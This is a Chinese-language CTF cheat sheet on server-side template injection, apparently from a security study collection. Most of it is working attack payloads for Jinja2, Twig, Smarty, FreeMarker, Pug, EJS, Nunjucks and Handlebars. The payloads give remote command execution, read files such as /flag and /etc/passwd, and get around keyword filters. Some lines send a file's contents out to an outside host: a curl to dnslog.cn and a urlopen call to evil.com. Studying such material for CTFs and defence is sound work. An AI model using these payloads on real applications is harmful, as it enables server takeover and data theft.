---
category: "模板注入"
tags: ["SSTI", "Jinja2", "Twig", "Smarty", "FreeMarker", "服务端模板注入", "RCE", "绕过"]
difficulty: "高级"
---

# 服务端模板注入SSTI

## 1. 概述
服务端模板注入（Server-Side Template Injection, SSTI）是指攻击者将恶意模板语法注入服务端模板引擎，由引擎解析执行导致代码执行或信息泄露。CTF中常见SSTI环境包括Python（Jinja2/Flask/Django）、PHP（Smarty/Twig）、Java（FreeMarker/Velocity）、Ruby（ERB/Slim）和Node.js（Pug/EJS/Nunjucks）。

**核心危害：**
- 读取敏感文件（`/etc/passwd`、`/flag`、源码）
- 远程代码执行（RCE）获取Shell
- 内网探测（Python `urlopen` 结合SSRF）

## 2. 核心原理

模板引擎将用户输入与模板混合编译执行。若用户输入未经过滤直接放入模板中解析，引擎会把 `{{}}`、`${}` 等语法当成代码执行。

```python
# Flask/Jinja2 漏洞代码
@app.route('/hello')
def hello():
    name = request.args.get('name')
    return render_template_string('Hello {{' + name + '}}')
    # 或 return render_template_string('hello %s' % name)
```

输入 `{{7*7}}` 返回 `49` 即存在SSTI。

**检测方法：**
```python
# Jinja2/Twig
{{7*7}}
{{7*'7'}} → 7777777

# Smarty
{7*7}

# FreeMarker
${7*7}

# Velocity
#set($x=7*7)$x

# Pug/Jade
#{7*7}

# EJS
<%=7*7%>

# ERB
<%= 7*7 %>
```

## 3. 关键技巧与Payload

### 3.1 Jinja2 (Python Flask) SSTI 完整利用链

**信息收集：**
```python
{{ config }}                    # Flask配置信息（含SECRET_KEY）
{{ self.__init__.__globals__ }} # 获取全局变量
{{ ''.__class__ }}             # <class 'str'>
{{ ''.__class__.__mro__ }}     # 方法解析顺序
{{ ''.__class__.__mro__[1].__subclasses__() }}  # object的所有子类
```

**经典利用链（通过subclasses找os模块）：**
```python
# 步骤1：找到 os._wrap_close 或 subprocess.Popen 或 warnings.catch_warnings
{{ ''.__class__.__mro__[1].__subclasses__() }}

# 步骤2：定位索引（手动数或用自动化脚本）
# 常见索引（取决于Python版本和环境）：
# <class 'os._wrap_close'> — 通常在 130~140 附近
# <class 'warnings.catch_warnings'> — 通常在 180~190 附近

# 步骤3：利用 os._wrap_close 执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[132].__init__.__globals__['popen']('ls').read() }}

# 步骤4：利用 warnings.catch_warnings 执行命令
{{ ''.__class__.__mro__[1].__subclasses__()[186].__init__.__globals__['__builtins__']['__import__']('os').popen('cat /flag').read() }}
```

**Python3 无globals绕过（通过builtins链）：**
```python
# 通过 __builtins__ 获取 eval/exec
{{ ''.__class__.__mro__[2].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").popen("id").read()') }}

# 通过 flask 的 lipsum (需Jinja2 2.10+)
{{ lipsum.__globals__['os'].popen('id').read() }}

# 通过 cycler
{{ cycler.__init__.__globals__.os.popen('id').read() }}

# 通过 joiner
{{ joiner.__init__.__globals__.os.popen('id').read() }}

# 通过 namespace
{{ namespace.__init__.__globals__.os.popen('id').read() }}

# 通过 get_flashed_messages
{{ get_flashed_messages.__globals__.os.popen('id').read() }}

# 通过 url_for
{{ url_for.__globals__['current_app'].config }}

# 通过 config.from_pyfile 读文件 (Python3)
{{ config.from_pyfile('/etc/passwd') or config.items() }}
```

### 3.2 Jinja2 过滤绕过

**`{{` 被过滤：**
```python
{% if 1==1 %}test{% endif %}       # 使用 {% %} 代替
{% for x in ''.__class__.__mro__[1].__subclasses__() %}{% if x.__name__=='_wrap_close' %}{{ x.__init__.__globals__['popen']('id').read() }}{% endif %}{% endfor %}

# 使用 {%%} 变量赋值
{% set a = ''.__class__.__mro__[1].__subclasses__() %}
```

**`.` 被过滤：**
```python
# 使用 [] 代替 .
{{ ''['__class__'] }}
{{ ''['__class__']['__mro__'][1]['__subclasses__']() }}

# 使用 |attr() 过滤器
{{ ''|attr('__class__') }}
{{ ''.__class__|attr('__base__') }}
{{ ''|attr('__class__')|attr('__mro__')|attr('__getitem__')(1)|attr('__subclasses__')() }}
```

**`[` `]` 被过滤：**
```python
# 使用 __getitem__
{{ ().__class__.__base__.__subclasses__().__getitem__(132) }}

# 使用 pop()
{{ ().__class__.__base__.__subclasses__().pop(132) }}
```

**`_` 被过滤（特殊字符过滤）：**
```python
# 使用 |attr 搭配十六进制
{{ ''|attr('\x5f\x5fclass\x5f\x5f') }}

# 使用 request参数传值
{{ ''|attr(request.args.param) }}  # param=__class__

# 使用 request.cookies
{{ ''|attr(request.cookies.x) }}  # Cookie: x=__class__

# 使用 dict 构造
{{ ''|attr(dict(c=1)|join) }}  # dict keys join 得到 'c'
```

**关键字黑名单绕过 (`class`, `base`, `init` 等被过滤)：**
```python
# 字符串拼接
{{ ''['__cla'+'ss__'] }}

# 反转
{{ ''['__ssalc__'[::-1]] }}

# request绕过
{{ ''|attr(request.args.key) }}&key=__class__

# Unicode/\x编码
{{ ''|attr('\x5f\x5f\x63\x6c\x61\x73\x73\x5f\x5f') }}

# base64
{{ ''|attr('X19jbGFzc19f'.decode('base64')) }}
```

**`popen`/`eval`/`system` 被过滤：**
```python
# 字符串拼接调用
{{ ()|attr('__cla'+'ss__') }}
{{ l|attr('__ini'+'t__') }}

# 使用 __import__ + getattr
{% set o = lipsum.__globals__.__builtins__.__import__('os') %}
{% set cmd = lipsum.__globals__.__builtins__.__dict__['pop'+'en']('id') %}
{{ cmd.read() }}

# 读取文件绕过命令执行
{{ lipsum.__globals__.__builtins__.open('/flag').read() }}
{{ get_flashed_messages.__globals__.__builtins__.open('/flag').read() }}
```

**无回显时数据外带：**
```python
# DNS外带
{{ lipsum.__globals__.__builtins__.eval("__import__('os').popen('curl `cat /flag`.dnslog.cn').read()") }}

# HTTP外带
{{ lipsum.__globals__.__builtins__.__import__('urllib').request.urlopen('http://evil.com/?c='+lipsum.__globals__.__builtins__.open('/flag').read()) }}
```

### 3.3 Twig (PHP) SSTI

**基础检测：**
```twig
{{7*7}}
{{_self}}
{{app}}
{{dump(app)}}
```

**利用链：**
```twig
<!-- Twig 1.x 利用 -->
{{_self.env.registerUndefinedFilterCallback("exec")}}
{{_self.env.getFilter("id")}}

{{_self.env.registerUndefinedFunctionCallback("system")}}
{{_self.env.getFunction("id")}}

<!-- Twig 2.x/3.x (Sandbox需绕过) -->
{{['id']|filter('system')}}
{{['id']|map('system')}}

<!-- 通过 sort 过滤器 -->
{{['id',""]|sort('system')}}

<!-- 通过 file_get_contents 读文件 -->
{{file_get_contents('/flag')}}

<!-- Twig3.x 新Payload -->
{{["id"]|filter("system")}}
{{["/flag"]|map("file_get_contents")|join}}
```

### 3.4 Smarty (PHP) SSTI

**基本Payload：**
```smarty
{7*7}

{php}echo 7*7;{/php}  <!-- 仅Smarty 2.x, 需{php}标签允许 -->

{Smarty_Internal_Write_File}
{literal}{/literal}
```

**RCE利用链：**
```smarty
<!-- Smarty v3 RCE (CVE-2017-1000480) -->
{self::getStreamVariable('file:///flag')}

<!-- 通过模板继承读文件 -->
{extends file='../../../etc/passwd'}

<!-- Smarty3 通过缓存名注入 -->
{block name=title}...{/block}
<!-- 需要缓存功能开启 -->
```

**Smarty安全模式绕过：**
```smarty
<!-- security is off时可用 -->
{system('id')}

<!-- 直接包含文件（需include_php开启） -->
{include_php('/flag.php')}

<!-- fetch读文件 -->
{fetch file='file:///flag'}

<!-- math equation RCE -->
{math equation="system('id')"}
```

### 3.5 FreeMarker (Java) SSTI

**基础检测：**
```freemarker
${7*7}
#{7*7}
<#if 1==1>true</#if>
```

**信息收集：**
```freemarker
${.version}
${.data_model}
${.globals}
<#assign ex = "freemarker.template.utility.Execute"?new()>
```

**命令执行（FreeMarker 2.3.31前可用）：**
```freemarker
<!-- Execute类（最常用） -->
<#assign ex = "freemarker.template.utility.Execute"?new()> ${ex("id")}

<!-- ObjectConstructor -->
<#assign oc = "freemarker.template.utility.ObjectConstructor"?new()>
${oc("","")} 和 ${oc("java.lang.ProcessBuilder",oc("java.util.ArrayList")?call())}

<!-- JythonRuntime -->
<#assign jr = "freemarker.template.utility.JythonRuntime"?new()>
${jr("__import__('os').popen('id').read()")}

<!-- Execute 过滤绕过(高版本) -->
<#assign value = "freemarker.template.utility.Execute"?new()>
${value("cmd /c whoami")}
# cmd /c 执行Windows命令

<!-- 读文件 -->
<#assign fi = "freemarker.template.utility.NormalizeNewlines"?new()>
${fi("file:///flag")}

${new("java.io.BufferedReader", new("java.io.FileReader", "/flag")).readLine()}
```

**FreeMarker 高版本绕过（API封禁后）：**
```freemarker
<!-- 利用ClassLoader加载 -->
${.data_model["org.apache.commons.collections"]...}

<!-- 配合其他JNDI/反序列化链 -->
```

### 3.6 Node.js模板引擎SSTI

**Pug/Jade：**
```jade
#{7*7}
#{function(){localLoad=global.process.mainModule.constructor._load;var sh=localLoad('child_process');return sh.execSync('id').toString()}()}

- global.process.mainModule.require('child_process').execSync('id').toString()
```

**EJS (Embedded JavaScript)：**
```ejs
<%=7*7%>
<%= process.mainModule.require('child_process').execSync('id') %>
```

**Nunjucks：**
```nunjucks
{{7*7}}
{{range.constructor("return global.process.mainModule.require('child_process').execSync('id')")()}}
```

**HBS (Handlebars)：**
```hbs
{{7*7}}
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |consolelist|}}
      {{this.pop}}
      {{this.push (lookup string.sub "constructor")}}
      {{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each consolelist}}
          {{#with (string.sub.apply 0 codelist)}}
            {{this}}
          {{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

## 4. 常见误区与注意事项
1. **render_template vs render_template_string**：Flask中 `render_template()` 是安全的（编译后插入变量），`render_template_string()` 拼接字符串才危险。
2. **Python版本的subclasses索引不同**：同一个Payload在不同Python版本/不同依赖下可能失效，离线时需先本地测试确定索引。
3. **Jinja2沙箱绕过不是万能**：Flask默认Jinja2无沙箱，但若配合`SandboxedEnvironment`则需额外绕过。
4. **Smarty v2/v3/v4区别大**：v2可直接`{php}`，v3+需要利用链，v4安全增强。
5. **FreeMarker版本敏感**：2.3.31+很多`new()`被禁止，需另找链。
6. **黑名单绕过优先考虑编码和拼接**：字符串拼接(`__cla'+'ss__`)、request参数传递、hex/unicode编码。
7. **无回显解决方案**：DNSlog外带、HTTP外带、curl/wget到外网VPS、写文件(Smarty/FreeMarker)、使用`{%print%}`标签。
8. **offline策略**：本地建立各模板引擎Docker环境用于Payload验证；保存多版本python的subclasses索引列表。

## 5. 实战示例

### 示例1：Jinja2 SSTI 无回显 + DNS外带
```
场景：页面渲染 `{{name}}` 但无输出回显，存在dnslog可用。
```
Payload：
```python
{% for i in ''.__class__.__mro__[1].__subclasses__() %}
  {% if i.__name__ == '_wrap_close' %}
    {{ i.__init__.__globals__['popen']('curl `cat /flag`.xxxx.dnslog.cn').read() }}
  {% endif %}
{% endfor %}
```

### 示例2：Jinja2 全关键字过滤绕过 + 文件读取
```
场景：过滤了 __class__, __init__, __globals__, popen, system, eval, os
```
Payload（通过 `|attr` + request参数 绕过）：
```python
# URL: /page?name={{ ()|attr(request.cookies.a)|attr(request.cookies.b)|attr(request.cookies.c)() }}
# Cookie: a=__class__; b=__init__; c=__globals__
# 然后进一步通过 __builtins__['open'] 读文件
```

## 6. 相关知识点
- 反序列化中的Python pickle利用（见06-反序列化漏洞）
- 命令注入与SSTI联动（见08-命令注入与代码注入）
- WAF绕过（见12-WAF绕过技术汇总）
- SSRF结合Jinja2内网探测（见07-SSRF与XXE注入）
- 原型链污染触发SSTI（Node.js模板引擎，见11-Node.js原型链污染）
